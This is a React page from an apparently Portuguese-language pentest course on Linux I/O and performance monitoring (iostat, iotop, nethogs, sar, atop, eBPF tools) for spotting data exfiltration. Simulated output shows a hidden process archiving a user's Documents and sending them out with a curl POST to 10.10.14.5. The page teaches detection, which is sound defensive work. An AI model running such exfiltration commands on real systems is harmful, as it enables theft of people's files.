import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function IOStat() {
  return (
    <PageContainer
      title="Monitoramento de I/O e performance"
      subtitle="iostat, vmstat, mpstat, sar, dstat, iotop, nethogs, atop — detectar I/O suspeito que delata exfil."
      difficulty="intermediario"
      timeToRead="17 min"
    >
      <h2>Por que monitorar I/O importa em pentest</h2>
      <p>
        Do lado <strong>defensivo</strong>: pico de tráfego de saída às 03:00 da manhã
        com 2 GB indo para um IP desconhecido = exfiltração em andamento. Do lado
        <strong> ofensivo</strong>: você precisa saber se a sua exfil está rodando
        rápido demais (gera alerta) ou se a CPU spike de cracking local vai delatar
        o implant. <code>iostat</code>, <code>nethogs</code> e <code>atop</code> são as
        lentes que enxergam isso.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y sysstat iotop nethogs atop dstat",
            out: `Setting up sysstat (12.6.1-2) ...
Setting up iotop (1.25-1) ...
Setting up nethogs (0.8.7-1) ...
Setting up atop (2.10.0-2) ...
Setting up dstat (0.7.4-7) ...
Created symlink /etc/systemd/system/sysstat.service.wants/...`,
            outType: "success",
          },
        ]}
      />

      <h2>vmstat — visão geral CPU/memória/IO</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "intervalo 2 segundos, 5 amostras",
            cmd: "vmstat 2 5",
            out: `procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 1  0      0 582100  18432 1446128    0    0    44    71  124  208  3  1 96  0  0
 2  0      0 581204  18432 1446128    0    0     0   140  481  912 11  3 86  0  0
 5  1      0 478128  18432 1546128    0    0     0 81920 2104 4231 38 12 18 32  0
 4  2      0 312488  18432 1712228    0    0     0 92160 2298 4502 41 14 12 33  0
 1  0      0 581952  18432 1446128    0    0     0   180  502  988 12  3 85  0  0`,
            outType: "info",
          },
        ]}
      />

      <CommandTable
        title="campos do vmstat"
        variations={[
          { cmd: "r", desc: "Processos rodando ou esperando CPU.", output: "Maior que nº de cores = bottleneck CPU." },
          { cmd: "b", desc: "Processos em uninterruptible sleep (geralmente I/O).", output: "Crônico = disco lento ou NFS travado." },
          { cmd: "si / so", desc: "Swap in / out (KB/s).", output: "> 0 sustentado = falta de RAM." },
          { cmd: "bi / bo", desc: "Blocks in/out do disco.", output: "Pico em bo = escrita pesada (exfil dump?)." },
          { cmd: "cs", desc: "Context switches por segundo.", output: ">10k em sistema idle = thrashing." },
          { cmd: "us / sy / id / wa / st", desc: "% tempo: user / sys / idle / iowait / stolen (VM).", output: "wa alto = disco engargala app." },
        ]}
      />

      <h2>iostat — quem está martelando o disco</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "iostat -xz 2 3",
            out: `Linux 6.11.0-kali2-amd64 (kali)         03/04/2026      _x86_64_        (8 CPU)

avg-cpu:  %user   %nice %system %iowait  %steal   %idle
           4.21    0.00    1.32    0.42    0.00   94.05

Device            r/s     w/s     rkB/s     wkB/s   rrqm/s   wrqm/s  %rrqm  %wrqm r_await w_await aqu-sz rareq-sz wareq-sz  svctm  %util
nvme0n1          1.42   18.91     22.32    412.71     0.00     8.21   0.00  30.27    0.18    1.42   0.03    15.71    21.83   0.41   0.84

avg-cpu:  %user   %nice %system %iowait  %steal   %idle
          38.42    0.00   12.18   32.17    0.00   17.23

Device            r/s     w/s     rkB/s     wkB/s   rrqm/s   wrqm/s  %rrqm  %wrqm r_await w_await aqu-sz rareq-sz wareq-sz  svctm  %util
nvme0n1          0.00  481.50      0.00  82176.00     0.00     0.00   0.00   0.00    0.00    8.42   4.05     0.00   170.71   2.07  99.71`,
            outType: "warning",
          },
        ]}
      />

      <CommandTable
        title="campos críticos do iostat -x"
        variations={[
          { cmd: "%util", desc: "% do tempo o dispositivo esteve ocupado.", output: "100% sustentado = saturação." },
          { cmd: "r_await / w_await", desc: "Latência média de I/O (ms).", output: "SSD: < 10ms é OK. > 50ms = problema." },
          { cmd: "aqu-sz", desc: "Tamanho médio da fila de I/O.", output: ">2 sustentado = mais I/O do que disco aguenta." },
          { cmd: "rkB/s / wkB/s", desc: "Throughput leitura/escrita.", output: "82 MB/s de escrita súbita = dump de DB / exfil." },
        ]}
      />

      <h2>iotop — qual processo está martelando</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "modo batch (-b), só processos com I/O ativo (-o), 2 amostras de 3s",
            cmd: "sudo iotop -boP -d 3 -n 2",
            out: `Total DISK READ :       0.00 B/s | Total DISK WRITE :     142.83 M/s
Current DISK READ:       0.00 B/s | Current DISK WRITE:     158.42 M/s
    PID  PRIO  USER     DISK READ DISK WRITE>    SWAPIN     IO    COMMAND
  14271 be/4 nobody       0.00 B/s  138.21 M/s  0.00 %  87.42 % tar -czf /tmp/.x11-unix/.loot.tgz /home/wallyson/Documents
   1284 be/4 wallyson     0.00 B/s    2.18 M/s  0.00 %   1.21 % Xorg
    412 be/4 root         0.00 B/s    1.92 M/s  0.00 %   0.42 % systemd-journald`,
            outType: "error",
          },
        ]}
      />

      <AlertBox type="danger" title="Pista clássica de exfil-em-progresso">
        Processo <code>nobody</code> em <code>/tmp/.x11-unix/</code> escrevendo um <code>.tgz</code> a 138 MB/s.
        Isso é exatamente o que <code>iotop -oP</code> mostra durante coleta antes do envio. Próximos passos:
        ver tamanho do arquivo, checar conexões saintes via <code>nethogs</code>.
      </AlertBox>

      <h2>nethogs — bandwidth POR processo</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo nethogs -d 1 -t",
            out: `Refreshing:
helper/14271/65534         0.000     12428.420
firefox/3204/1000          18.420       42.108
ssh/2104/1000               0.012        0.018
unknown TCP                 0.000        0.412`,
            outType: "warning",
          },
        ]}
      />
      <p>
        Saída em <code>KB/s</code>: <strong>SENT</strong> e <strong>RECEIVED</strong>.
        12 MB/s de upload de um processo <code>helper</code> (uid 65534 = nobody) em 22h da noite
        é alarme vermelho.
      </p>

      <h2>ss / iftop — quem está conectado</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "todos os sockets TCP estabelecidos com processo dono",
            cmd: "sudo ss -tnpa state established",
            out: `Recv-Q  Send-Q   Local Address:Port    Peer Address:Port  Process
     0       0    192.168.1.10:60112    10.10.14.5:4444    users:(("helper",pid=14271,fd=2))
     0       0    192.168.1.10:443      140.82.121.4:443   users:(("firefox",pid=3204,fd=42))
     0       0       127.0.0.1:5432    127.0.0.1:48802    users:(("postgres",pid=902,fd=14))`,
            outType: "info",
          },
          {
            comment: "tráfego em tempo real (TUI), agregado por host",
            cmd: "sudo iftop -i wlan0 -nNP",
            out: `(abre TUI mostrando conexão por conexão, KB/s in/out, totais 2s/10s/40s)`,
            outType: "muted",
          },
        ]}
      />

      <h2>mpstat — CPU por core</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "mpstat -P ALL 2 1",
            out: `Linux 6.11.0-kali2-amd64 (kali)         03/04/2026      _x86_64_        (8 CPU)

15:02:11     CPU    %usr   %nice    %sys %iowait    %irq   %soft  %steal  %guest  %gnice   %idle
15:02:13     all   28.42    0.00    8.71    1.21    0.00    0.12    0.00    0.00    0.00   61.54
15:02:13       0   12.18    0.00    3.42    0.00    0.00    0.00    0.00    0.00    0.00   84.40
15:02:13       1   18.42    0.00    4.08    0.00    0.00    0.00    0.00    0.00    0.00   77.50
15:02:13       2   99.50    0.00    0.50    0.00    0.00    0.00    0.00    0.00    0.00    0.00
15:02:13       3    9.42    0.00    3.18    9.71    0.00    0.42    0.00    0.00    0.00   77.27
15:02:13       4   14.21    0.00    5.42    0.00    0.00    0.00    0.00    0.00    0.00   80.37`,
            outType: "info",
          },
        ]}
      />
      <p>
        CPU 2 a 99.5% sozinha = processo single-threaded fritando (cracking? mineração?).
        Use <code>top -p $(pgrep -d, -u nobody) -H</code> para ver qual thread está pegando a CPU.
      </p>

      <h2>dstat — tudo de uma vez</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "dstat -tcndmgyl 2 4",
            out: `----system---- ----total-cpu-usage---- -dsk/total- -net/total- ---paging-- ---system--
     time     |usr sys idl wai stl| read  writ| recv  send|  in   out | int   csw
03-04 15:11:01| 38  12  18  32   0|   0   82M|  84k 12.4M|   0     0 |2104  4231
03-04 15:11:03| 41  14  12  33   0|   0   91M| 102k 13.8M|   0     0 |2298  4502
03-04 15:11:05|  4   1  94   1   0|   0  142k|  18k  4042B|   0     0 | 481   912
03-04 15:11:07|  3   1  96   0   0|   0   71k|  12k  2104B|   0     0 | 412   824`,
            outType: "warning",
          },
        ]}
      />

      <p>
        <code>dstat</code> condensa CPU, disco, rede e paging em uma linha por amostra.
        A primeira linha mostra CPU 38% user + 32% iowait + 82 MB/s de escrita + 12.4 MB/s
        de envio rede = <strong>compactação seguida de exfil</strong>.
      </p>

      <h2>sar — histórico (não só agora)</h2>
      <p>
        <code>sar</code> (Sysstat Activity Reporter) coleta estatísticas a cada 10 min via cron
        (<code>/etc/cron.d/sysstat</code>) e armazena em <code>/var/log/sysstat/</code>.
        Permite olhar para trás: "como estava o servidor às 03:14 da quinta passada?".
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sar -u -s 03:00:00 -e 04:00:00 -f /var/log/sysstat/sa02",
            out: `Linux 6.11.0-kali2-amd64 (kali)         02/04/2026      _x86_64_        (8 CPU)

03:00:01    CPU     %user     %nice   %system   %iowait    %steal     %idle
03:10:01    all      4.12      0.00      1.42      0.42      0.00     94.04
03:20:01    all      3.81      0.00      1.21      0.12      0.00     94.86
03:30:01    all     38.42      0.00     12.18     32.17      0.00     17.23
03:40:01    all     42.18      0.00     14.42     31.81      0.00     11.59
03:50:01    all     12.42      0.00      4.21      8.42      0.00     74.95
Average:    all     20.19      0.00      6.69     14.59      0.00     58.53`,
            outType: "warning",
          },
          {
            comment: "tráfego de rede no mesmo período",
            cmd: "sar -n DEV -s 03:00:00 -e 04:00:00 -f /var/log/sysstat/sa02 | grep -v lo",
            out: `03:00:01     IFACE   rxpck/s   txpck/s    rxkB/s    txkB/s   rxcmp/s   txcmp/s  rxmcst/s
03:30:01     wlan0    142.42   1841.83     18.42  12782.42      0.00      0.00      0.18
03:40:01     wlan0    158.18   1923.71     21.18  13412.71      0.00      0.00      0.12`,
            outType: "error",
          },
        ]}
      />
      <p>
        Pico de TX simultâneo com CPU/iowait alto entre 03:30 e 03:50 = janela de 20 min de exfil.
        Cruze com <code>journalctl --since '2026-04-02 03:30' --until '2026-04-02 03:50'</code> e
        com auth.log para identificar o vetor.
      </p>

      <h2>atop — o "top dos sysadmins"</h2>
      <p>
        <code>atop</code> roda como serviço, grava amostras em <code>/var/log/atop/</code> a cada
        10 min, e permite "rebobinar" pelo passado com t/T. Em IR é uma das primeiras coisas que
        a gente checa.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo atop -r /var/log/atop/atop_20260402 -b 03:30",
            out: `ATOP - kali        2026/04/02  03:30:01     -----------     10m0s elapsed
PRC | sys   12.42s | user 38.42s | #proc 247 | #zombie 0 | #exit 14 | #lru 0 |
CPU | sys    6%    | user  19%   | irq   0%  | idle  74%  | wait  32% |  steal 0%  |
MEM | tot   3.8G   | free  582M  | cache 1.4G | buff  18M  |
DSK |          nvme0n1  |  busy 99% | read 0 | write 481 | KiB/r 0 | KiB/w 170 |
NET |  transport  | tcpi 184 | tcpo 1841 | udpi 12 | udpo 18 | tcpao 1 | tcppo 1 |

  PID    SYSCPU  USRCPU   VGROW  RGROW   RDDSK  WRDSK ST EXC   THR   S CPU   CMD
14271     1.42s  18.42s  +12.4M  +9.2M    0K     1.4G S    -     1   R 99%  helper
 3204     0.81s   2.42s    0K      0K   18K   142K  S    -    21   S  3%  firefox
  812     0.12s   0.04s    0K      0K    0K   142K  S    -     1   S  0%  cron`,
            outType: "warning",
          },
        ]}
      />

      <CodeBlock
        language="bash"
        title="atalhos do atop interativo"
        code={`# Geral:
t / T   próxima / amostra anterior (rebobinar histórico)
b       jump pra hora especifica (formato HH:MM)
i       intervalo de refresh

# Visualizações (focar):
g       processos (default)
m       memória (RSIZE, VSIZE, RGROW, etc)
d       disco (RDDSK/WRDSK por proc)
n       rede (TCPRCV/TCPSND por proc — precisa netatop)
s       schedule (S/R/D state)

# Filtros:
P       só processos ativos (skip idle)
u       filtrar por usuário
/       buscar por nome de processo`}
      />

      <h2>Vendo I/O em tempo real (eBPF)</h2>
      <p>
        Tools modernas baseadas em <strong>BCC/bpftrace</strong> dão visibilidade
        granular sem overhead. Em Kali: <code>sudo apt install bpfcc-tools bpftrace</code>.
      </p>

      <CommandTable
        title="ferramentas eBPF úteis"
        variations={[
          { cmd: "biolatency-bpfcc", desc: "Histograma de latência de I/O em microssegundos.", output: "Mostra exatamente onde o disco está engasgando." },
          { cmd: "biotop-bpfcc", desc: "top de I/O por processo (granular).", output: "PID  COMM   D  MAJ MIN  DISK   I/O  Kbytes  AVGms" },
          { cmd: "execsnoop-bpfcc", desc: "Cada execve() em real-time.", output: "Vê implant chamando bash, curl, etc., na hora." },
          { cmd: "opensnoop-bpfcc -n helper", desc: "Cada open() por proc 'helper'.", output: "Quais arquivos o malware lê/escreve." },
          { cmd: "tcpconnect-bpfcc", desc: "Cada nova conexão TCP outgoing.", output: "PID    COMM   IP SADDR DADDR  DPORT" },
          { cmd: "filetop-bpfcc", desc: "top de I/O por arquivo.", output: "Identifica DB sendo lido em rate suspeito." },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo execsnoop-bpfcc",
            out: `PCOMM            PID    PPID   RET ARGS
sh               14820  14271    0 sh -c tar czf /tmp/.x11-unix/.loot.tgz /home/wallyson/Documents
tar              14821  14820    0 tar czf /tmp/.x11-unix/.loot.tgz /home/wallyson/Documents
sh               14905  14271    0 sh -c curl -X POST --data-binary @/tmp/.x11-unix/.loot.tgz http://10.10.14.5/u
curl             14906  14905    0 curl -X POST --data-binary @/tmp/.x11-unix/.loot.tgz http://10.10.14.5/u`,
            outType: "error",
          },
        ]}
      />

      <h2>Tabela-resumo: que ferramenta usar</h2>
      <CommandTable
        title="cheatsheet"
        variations={[
          { cmd: "Sistema lento agora", desc: "vmstat 2 5 + iostat -xz 2 + mpstat -P ALL 2", output: "Vê CPU, disco e cores em paralelo." },
          { cmd: "Disco saturado", desc: "iostat -xz + iotop -oP", output: "%util alto -> qual proc tá escrevendo." },
          { cmd: "Rede saturada", desc: "ss -tnpa + nethogs + iftop", output: "Quem está conectado, quanto está transferindo." },
          { cmd: "RAM esgotando", desc: "free -m + vmstat 2 (si/so) + ps -eo rss,cmd --sort=-rss | head", output: "Top consumidores de RSS." },
          { cmd: "Investigação histórica", desc: "sar -u/-r/-n DEV -f sa<dia> + atop -r", output: "Olhar ontem e semana passada." },
          { cmd: "Caçar implant ativo", desc: "execsnoop-bpfcc + tcpconnect-bpfcc + opensnoop-bpfcc", output: "Real-time, granular, sem grep." },
        ]}
      />

      <PracticeBox
        title="Detectar exfil simulada"
        goal="Subir um cenário, dispará-lo, capturá-lo com 3 ferramentas diferentes."
        steps={[
          "Em um terminal, suba listener: nc -lvnp 9999 > /dev/null.",
          "Em outro, suba 3 monitores em paralelo: nethogs, iotop -oP e execsnoop-bpfcc.",
          "Em um terceiro, gere 100MB de dado e mande pelo nc: dd if=/dev/urandom bs=1M count=100 | nc 127.0.0.1 9999.",
          "Confirme que os 3 monitores capturaram a anomalia.",
        ]}
        command={`# terminal 1
nc -lvnp 9999 > /dev/null &

# terminal 2 (monitores - rode 1 em cada aba)
sudo iotop -oPb -d 2 -n 5
sudo nethogs -d 1 -t -c 5
sudo execsnoop-bpfcc

# terminal 3 (dispara exfil simulada)
dd if=/dev/urandom bs=1M count=100 | nc 127.0.0.1 9999`}
        expected={`iotop:    dd  ... DISK READ 12.4 M/s  DISK WRITE 0 B/s  IO 8 %
nethogs:  nc/14921/1000   0.000    52428.421
execsnoop: dd  14920  14801    0 dd if=/dev/urandom bs=1M count=100
           nc  14921  14801    0 nc 127.0.0.1 9999
listener (terminal 1): "Connection received on 127.0.0.1 ..."
                      depois encerra ao terminar o dd`}
        verify="Cada monitor deve mostrar pelo menos uma linha referente ao 'dd' ou 'nc'. Compare a vazão (~50MB/s) entre nethogs e iotop — devem bater."
      />

      <AlertBox type="info" title="Habilitar coleta histórica de uma vez">
        Em qualquer Kali/Debian/Ubuntu novo, depois de instalar o sysstat:
        <code>{` sudo sed -i 's/ENABLED="false"/ENABLED="true"/' /etc/default/sysstat && sudo systemctl enable --now sysstat`}</code>.
        Isso ativa a coleta automática a cada 10 min em <code>/var/log/sysstat/</code>. Em 24h
        você já tem baseline para comparar contra futuras anomalias.
      </AlertBox>
    </PageContainer>
  );
}
